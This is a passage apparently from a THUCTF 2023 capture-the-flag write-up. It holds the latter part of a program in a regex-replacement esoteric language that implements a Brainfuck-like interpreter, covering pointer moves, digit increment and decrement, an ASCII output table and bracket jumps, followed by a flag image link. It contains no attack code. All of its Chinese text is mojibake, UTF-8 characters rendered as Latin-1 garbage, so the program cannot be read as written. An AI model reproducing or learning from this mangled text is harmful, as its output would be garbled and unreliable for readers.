    å¦‚æœçœ‹åˆ°ã€ğŸ¤”<ã€‘å°±è·³è½¬åˆ°ã€å‘å·¦å–µã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€ğŸ¤”\+ã€‘å°±è·³è½¬åˆ°ã€åŠ ä¸€å–µã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€ğŸ¤”-ã€‘å°±è·³è½¬åˆ°ã€å‡ä¸€å–µã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€ğŸ¤”\.ã€‘å°±è·³è½¬åˆ°ã€è¾“å‡ºå–µã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€ğŸ¤”[a-h]ã€‘å°±è·³è½¬åˆ°ã€å·¦æ‹¬å·å–µã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€ğŸ¤”[A-H]ã€‘å°±è·³è½¬åˆ°ã€å³æ‹¬å·å–µã€‘å–µ
å‘å³å–µï¼š
    æŠŠã€ğŸŒš(,\d+)ã€‘æ›¿æ¢æˆã€\1ğŸŒšã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€^ã€‘å°±è·³è½¬åˆ°ã€ä¸‹ä¸€æ¡æŒ‡ä»¤å–µã€‘å–µ
å‘å·¦å–µï¼š
    æŠŠã€(,\d+)ğŸŒšã€‘æ›¿æ¢æˆã€ğŸŒš\1ã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€^ã€‘å°±è·³è½¬åˆ°ã€ä¸‹ä¸€æ¡æŒ‡ä»¤å–µã€‘å–µ
åŠ ä¸€å–µï¼š
    æŠŠã€0ğŸŒšã€‘æ›¿æ¢æˆã€1ğŸŒã€‘å–µ
    æŠŠã€1ğŸŒšã€‘æ›¿æ¢æˆã€2ğŸŒã€‘å–µ
    æŠŠã€2ğŸŒšã€‘æ›¿æ¢æˆã€3ğŸŒã€‘å–µ
    æŠŠã€3ğŸŒšã€‘æ›¿æ¢æˆã€4ğŸŒã€‘å–µ
    æŠŠã€4ğŸŒšã€‘æ›¿æ¢æˆã€5ğŸŒã€‘å–µ
    æŠŠã€5ğŸŒšã€‘æ›¿æ¢æˆã€6ğŸŒã€‘å–µ
    æŠŠã€6ğŸŒšã€‘æ›¿æ¢æˆã€7ğŸŒã€‘å–µ
    æŠŠã€7ğŸŒšã€‘æ›¿æ¢æˆã€8ğŸŒã€‘å–µ
    æŠŠã€8ğŸŒšã€‘æ›¿æ¢æˆã€9ğŸŒã€‘å–µ
    æŠŠã€,9ğŸŒšã€‘æ›¿æ¢æˆã€,10ğŸŒã€‘å–µ
    æŠŠã€09ğŸŒšã€‘æ›¿æ¢æˆã€10ğŸŒã€‘å–µ
    æŠŠã€19ğŸŒšã€‘æ›¿æ¢æˆã€20ğŸŒã€‘å–µ
    æŠŠã€29ğŸŒšã€‘æ›¿æ¢æˆã€30ğŸŒã€‘å–µ
    æŠŠã€39ğŸŒšã€‘æ›¿æ¢æˆã€40ğŸŒã€‘å–µ
    æŠŠã€49ğŸŒšã€‘æ›¿æ¢æˆã€50ğŸŒã€‘å–µ
    æŠŠã€59ğŸŒšã€‘æ›¿æ¢æˆã€60ğŸŒã€‘å–µ
    æŠŠã€69ğŸŒšã€‘æ›¿æ¢æˆã€70ğŸŒã€‘å–µ
    æŠŠã€79ğŸŒšã€‘æ›¿æ¢æˆã€80ğŸŒã€‘å–µ
    æŠŠã€89ğŸŒšã€‘æ›¿æ¢æˆã€90ğŸŒã€‘å–µ
    æŠŠã€,99ğŸŒšã€‘æ›¿æ¢æˆã€,100ğŸŒã€‘å–µ
    æŠŠã€099ğŸŒšã€‘æ›¿æ¢æˆã€100ğŸŒã€‘å–µ
    æŠŠã€199ğŸŒšã€‘æ›¿æ¢æˆã€200ğŸŒã€‘å–µ
    æŠŠã€299ğŸŒšã€‘æ›¿æ¢æˆã€300ğŸŒã€‘å–µ
    æŠŠã€399ğŸŒšã€‘æ›¿æ¢æˆã€400ğŸŒã€‘å–µ
    æŠŠã€499ğŸŒšã€‘æ›¿æ¢æˆã€500ğŸŒã€‘å–µ
    æŠŠã€599ğŸŒšã€‘æ›¿æ¢æˆã€600ğŸŒã€‘å–µ
    æŠŠã€699ğŸŒšã€‘æ›¿æ¢æˆã€700ğŸŒã€‘å–µ
    æŠŠã€799ğŸŒšã€‘æ›¿æ¢æˆã€800ğŸŒã€‘å–µ
    æŠŠã€899ğŸŒšã€‘æ›¿æ¢æˆã€900ğŸŒã€‘å–µ
    æŠŠã€ğŸŒã€‘æ›¿æ¢æˆã€ğŸŒšã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€^ã€‘å°±è·³è½¬åˆ°ã€ä¸‹ä¸€æ¡æŒ‡ä»¤å–µã€‘å–µ
å‡ä¸€å–µï¼š
    æŠŠã€1ğŸŒšã€‘æ›¿æ¢æˆã€0ğŸŒã€‘å–µ
    æŠŠã€2ğŸŒšã€‘æ›¿æ¢æˆã€1ğŸŒã€‘å–µ
    æŠŠã€3ğŸŒšã€‘æ›¿æ¢æˆã€2ğŸŒã€‘å–µ
    æŠŠã€4ğŸŒšã€‘æ›¿æ¢æˆã€3ğŸŒã€‘å–µ
    æŠŠã€5ğŸŒšã€‘æ›¿æ¢æˆã€4ğŸŒã€‘å–µ
    æŠŠã€6ğŸŒšã€‘æ›¿æ¢æˆã€5ğŸŒã€‘å–µ
    æŠŠã€7ğŸŒšã€‘æ›¿æ¢æˆã€6ğŸŒã€‘å–µ
    æŠŠã€8ğŸŒšã€‘æ›¿æ¢æˆã€7ğŸŒã€‘å–µ
    æŠŠã€9ğŸŒšã€‘æ›¿æ¢æˆã€8ğŸŒã€‘å–µ
    æŠŠã€,10ğŸŒšã€‘æ›¿æ¢æˆã€,9ğŸŒã€‘å–µ
    æŠŠã€10ğŸŒšã€‘æ›¿æ¢æˆã€09ğŸŒã€‘å–µ
    æŠŠã€20ğŸŒšã€‘æ›¿æ¢æˆã€19ğŸŒã€‘å–µ
    æŠŠã€30ğŸŒšã€‘æ›¿æ¢æˆã€29ğŸŒã€‘å–µ
    æŠŠã€40ğŸŒšã€‘æ›¿æ¢æˆã€39ğŸŒã€‘å–µ
    æŠŠã€50ğŸŒšã€‘æ›¿æ¢æˆã€49ğŸŒã€‘å–µ
    æŠŠã€60ğŸŒšã€‘æ›¿æ¢æˆã€59ğŸŒã€‘å–µ
    æŠŠã€70ğŸŒšã€‘æ›¿æ¢æˆã€69ğŸŒã€‘å–µ
    æŠŠã€80ğŸŒšã€‘æ›¿æ¢æˆã€79ğŸŒã€‘å–µ
    æŠŠã€90ğŸŒšã€‘æ›¿æ¢æˆã€89ğŸŒã€‘å–µ
    æŠŠã€,100ğŸŒšã€‘æ›¿æ¢æˆã€,99ğŸŒã€‘å–µ
    æŠŠã€100ğŸŒšã€‘æ›¿æ¢æˆã€099ğŸŒã€‘å–µ
    æŠŠã€200ğŸŒšã€‘æ›¿æ¢æˆã€199ğŸŒã€‘å–µ
    æŠŠã€300ğŸŒšã€‘æ›¿æ¢æˆã€299ğŸŒã€‘å–µ
    æŠŠã€400ğŸŒšã€‘æ›¿æ¢æˆã€399ğŸŒã€‘å–µ
    æŠŠã€500ğŸŒšã€‘æ›¿æ¢æˆã€499ğŸŒã€‘å–µ
    æŠŠã€600ğŸŒšã€‘æ›¿æ¢æˆã€599ğŸŒã€‘å–µ
    æŠŠã€700ğŸŒšã€‘æ›¿æ¢æˆã€699ğŸŒã€‘å–µ
    æŠŠã€800ğŸŒšã€‘æ›¿æ¢æˆã€799ğŸŒã€‘å–µ
    æŠŠã€900ğŸŒšã€‘æ›¿æ¢æˆã€899ğŸŒã€‘å–µ
    æŠŠã€ğŸŒã€‘æ›¿æ¢æˆã€ğŸŒšã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€^ã€‘å°±è·³è½¬åˆ°ã€ä¸‹ä¸€æ¡æŒ‡ä»¤å–µã€‘å–µ
è¾“å‡ºå–µï¼š
    æŠŠã€(ğŸ‰[\s\S]*,32ğŸŒš)ã€‘æ›¿æ¢æˆã€ \1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,33ğŸŒš)ã€‘æ›¿æ¢æˆã€!\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,34ğŸŒš)ã€‘æ›¿æ¢æˆã€"\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,35ğŸŒš)ã€‘æ›¿æ¢æˆã€#\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,36ğŸŒš)ã€‘æ›¿æ¢æˆã€$\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,37ğŸŒš)ã€‘æ›¿æ¢æˆã€%\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,38ğŸŒš)ã€‘æ›¿æ¢æˆã€&\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,39ğŸŒš)ã€‘æ›¿æ¢æˆã€'\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,40ğŸŒš)ã€‘æ›¿æ¢æˆã€(\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,41ğŸŒš)ã€‘æ›¿æ¢æˆã€)\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,42ğŸŒš)ã€‘æ›¿æ¢æˆã€*\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,43ğŸŒš)ã€‘æ›¿æ¢æˆã€+\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,44ğŸŒš)ã€‘æ›¿æ¢æˆã€,\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,45ğŸŒš)ã€‘æ›¿æ¢æˆã€-\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,46ğŸŒš)ã€‘æ›¿æ¢æˆã€.\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,47ğŸŒš)ã€‘æ›¿æ¢æˆã€/\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,48ğŸŒš)ã€‘æ›¿æ¢æˆã€0\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,49ğŸŒš)ã€‘æ›¿æ¢æˆã€1\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,50ğŸŒš)ã€‘æ›¿æ¢æˆã€2\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,51ğŸŒš)ã€‘æ›¿æ¢æˆã€3\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,52ğŸŒš)ã€‘æ›¿æ¢æˆã€4\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,53ğŸŒš)ã€‘æ›¿æ¢æˆã€5\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,54ğŸŒš)ã€‘æ›¿æ¢æˆã€6\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,55ğŸŒš)ã€‘æ›¿æ¢æˆã€7\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,56ğŸŒš)ã€‘æ›¿æ¢æˆã€8\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,57ğŸŒš)ã€‘æ›¿æ¢æˆã€9\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,58ğŸŒš)ã€‘æ›¿æ¢æˆã€:\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,59ğŸŒš)ã€‘æ›¿æ¢æˆã€;\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,60ğŸŒš)ã€‘æ›¿æ¢æˆã€<\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,61ğŸŒš)ã€‘æ›¿æ¢æˆã€=\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,62ğŸŒš)ã€‘æ›¿æ¢æˆã€>\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,63ğŸŒš)ã€‘æ›¿æ¢æˆã€?\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,64ğŸŒš)ã€‘æ›¿æ¢æˆã€@\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,65ğŸŒš)ã€‘æ›¿æ¢æˆã€A\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,66ğŸŒš)ã€‘æ›¿æ¢æˆã€B\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,67ğŸŒš)ã€‘æ›¿æ¢æˆã€C\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,68ğŸŒš)ã€‘æ›¿æ¢æˆã€D\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,69ğŸŒš)ã€‘æ›¿æ¢æˆã€E\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,70ğŸŒš)ã€‘æ›¿æ¢æˆã€F\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,71ğŸŒš)ã€‘æ›¿æ¢æˆã€G\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,72ğŸŒš)ã€‘æ›¿æ¢æˆã€H\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,73ğŸŒš)ã€‘æ›¿æ¢æˆã€I\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,74ğŸŒš)ã€‘æ›¿æ¢æˆã€J\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,75ğŸŒš)ã€‘æ›¿æ¢æˆã€K\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,76ğŸŒš)ã€‘æ›¿æ¢æˆã€L\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,77ğŸŒš)ã€‘æ›¿æ¢æˆã€M\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,78ğŸŒš)ã€‘æ›¿æ¢æˆã€N\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,79ğŸŒš)ã€‘æ›¿æ¢æˆã€O\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,80ğŸŒš)ã€‘æ›¿æ¢æˆã€P\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,81ğŸŒš)ã€‘æ›¿æ¢æˆã€Q\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,82ğŸŒš)ã€‘æ›¿æ¢æˆã€R\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,83ğŸŒš)ã€‘æ›¿æ¢æˆã€S\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,84ğŸŒš)ã€‘æ›¿æ¢æˆã€T\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,85ğŸŒš)ã€‘æ›¿æ¢æˆã€U\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,86ğŸŒš)ã€‘æ›¿æ¢æˆã€V\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,87ğŸŒš)ã€‘æ›¿æ¢æˆã€W\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,88ğŸŒš)ã€‘æ›¿æ¢æˆã€X\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,89ğŸŒš)ã€‘æ›¿æ¢æˆã€Y\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,90ğŸŒš)ã€‘æ›¿æ¢æˆã€Z\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,91ğŸŒš)ã€‘æ›¿æ¢æˆã€[\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,92ğŸŒš)ã€‘æ›¿æ¢æˆã€\\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,93ğŸŒš)ã€‘æ›¿æ¢æˆã€]\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,94ğŸŒš)ã€‘æ›¿æ¢æˆã€^\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,95ğŸŒš)ã€‘æ›¿æ¢æˆã€_\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,96ğŸŒš)ã€‘æ›¿æ¢æˆã€`\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,97ğŸŒš)ã€‘æ›¿æ¢æˆã€a\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,98ğŸŒš)ã€‘æ›¿æ¢æˆã€b\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,99ğŸŒš)ã€‘æ›¿æ¢æˆã€c\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,100ğŸŒš)ã€‘æ›¿æ¢æˆã€d\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,101ğŸŒš)ã€‘æ›¿æ¢æˆã€e\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,102ğŸŒš)ã€‘æ›¿æ¢æˆã€f\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,103ğŸŒš)ã€‘æ›¿æ¢æˆã€g\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,104ğŸŒš)ã€‘æ›¿æ¢æˆã€h\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,105ğŸŒš)ã€‘æ›¿æ¢æˆã€i\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,106ğŸŒš)ã€‘æ›¿æ¢æˆã€j\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,107ğŸŒš)ã€‘æ›¿æ¢æˆã€k\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,108ğŸŒš)ã€‘æ›¿æ¢æˆã€l\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,109ğŸŒš)ã€‘æ›¿æ¢æˆã€m\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,110ğŸŒš)ã€‘æ›¿æ¢æˆã€n\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,111ğŸŒš)ã€‘æ›¿æ¢æˆã€o\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,112ğŸŒš)ã€‘æ›¿æ¢æˆã€p\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,113ğŸŒš)ã€‘æ›¿æ¢æˆã€q\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,114ğŸŒš)ã€‘æ›¿æ¢æˆã€r\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,115ğŸŒš)ã€‘æ›¿æ¢æˆã€s\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,116ğŸŒš)ã€‘æ›¿æ¢æˆã€t\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,117ğŸŒš)ã€‘æ›¿æ¢æˆã€u\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,118ğŸŒš)ã€‘æ›¿æ¢æˆã€v\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,119ğŸŒš)ã€‘æ›¿æ¢æˆã€w\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,120ğŸŒš)ã€‘æ›¿æ¢æˆã€x\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,121ğŸŒš)ã€‘æ›¿æ¢æˆã€y\1ã€‘å–µ
    æŠŠã€(ğŸ‰[\s\S]*,122ğŸŒš)ã€‘æ›¿æ¢æˆã€z\1ã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€^ã€‘å°±è·³è½¬åˆ°ã€ä¸‹ä¸€æ¡æŒ‡ä»¤å–µã€‘å–µ
å·¦æ‹¬å·å–µï¼š
    å¦‚æœæ²¡çœ‹åˆ°ã€,0ğŸŒšã€‘å°±è·³è½¬åˆ°ã€ä¸‹ä¸€æ¡æŒ‡ä»¤å–µã€‘å–µ
    æŠŠã€ğŸ¤”(a.*?A)ã€‘æ›¿æ¢æˆã€\1ğŸ™‚ã€‘å–µ
    æŠŠã€ğŸ¤”(b.*?B)ã€‘æ›¿æ¢æˆã€\1ğŸ™‚ã€‘å–µ
    æŠŠã€ğŸ¤”(c.*?C)ã€‘æ›¿æ¢æˆã€\1ğŸ™‚ã€‘å–µ
    æŠŠã€ğŸ¤”(d.*?D)ã€‘æ›¿æ¢æˆã€\1ğŸ™‚ã€‘å–µ
    æŠŠã€ğŸ¤”(e.*?E)ã€‘æ›¿æ¢æˆã€\1ğŸ™‚ã€‘å–µ
    æŠŠã€ğŸ¤”(f.*?F)ã€‘æ›¿æ¢æˆã€\1ğŸ™‚ã€‘å–µ
    æŠŠã€ğŸ¤”(g.*?G)ã€‘æ›¿æ¢æˆã€\1ğŸ™‚ã€‘å–µ
    æŠŠã€ğŸ¤”(h.*?H)ã€‘æ›¿æ¢æˆã€\1ğŸ™‚ã€‘å–µ
    æŠŠã€ğŸ™‚ã€‘æ›¿æ¢æˆã€ğŸ¤”ã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€^ã€‘å°±è·³è½¬åˆ°ã€åˆ¤æ–­å–µã€‘å–µ
å³æ‹¬å·å–µï¼š
    å¦‚æœçœ‹åˆ°ã€,0ğŸŒšã€‘å°±è·³è½¬åˆ°ã€ä¸‹ä¸€æ¡æŒ‡ä»¤å–µã€‘å–µ
    æŠŠã€a([^A]*)ğŸ¤”Aã€‘æ›¿æ¢æˆã€ağŸ™‚\1Aã€‘å–µ
    æŠŠã€b([^B]*)ğŸ¤”Bã€‘æ›¿æ¢æˆã€bğŸ™‚\1Bã€‘å–µ
    æŠŠã€c([^C]*)ğŸ¤”Cã€‘æ›¿æ¢æˆã€cğŸ™‚\1Cã€‘å–µ
    æŠŠã€d([^D]*)ğŸ¤”Dã€‘æ›¿æ¢æˆã€dğŸ™‚\1Dã€‘å–µ
    æŠŠã€e([^E]*)ğŸ¤”Eã€‘æ›¿æ¢æˆã€eğŸ™‚\1Eã€‘å–µ
    æŠŠã€f([^F]*)ğŸ¤”Fã€‘æ›¿æ¢æˆã€fğŸ™‚\1Fã€‘å–µ
    æŠŠã€g([^G]*)ğŸ¤”Gã€‘æ›¿æ¢æˆã€gğŸ™‚\1Gã€‘å–µ
    æŠŠã€h([^H]*)ğŸ¤”Hã€‘æ›¿æ¢æˆã€hğŸ™‚\1Hã€‘å–µ
    æŠŠã€ğŸ™‚ã€‘æ›¿æ¢æˆã€ğŸ¤”ã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€^ã€‘å°±è·³è½¬åˆ°ã€åˆ¤æ–­å–µã€‘å–µ
ä¸‹ä¸€æ¡æŒ‡ä»¤å–µï¼š
    æŠŠã€ğŸ¤”(.)ã€‘æ›¿æ¢æˆã€\1ğŸ¤”ã€‘å–µ
åˆ¤æ–­å–µï¼š
    å¦‚æœæ²¡çœ‹åˆ°ã€ğŸ¤”$ã€‘å°±è·³è½¬åˆ°ã€å¾ªç¯å–µã€‘å–µ
    æŠŠã€ğŸ‰[\s\S]*ã€‘æ›¿æ¢æˆã€ã€‘å–µ
ç»“æŸå–µï¼š
    è°¢è°¢å–µ
```

![flag3 å–µ](thuctf2023/filtered-flag3.png)
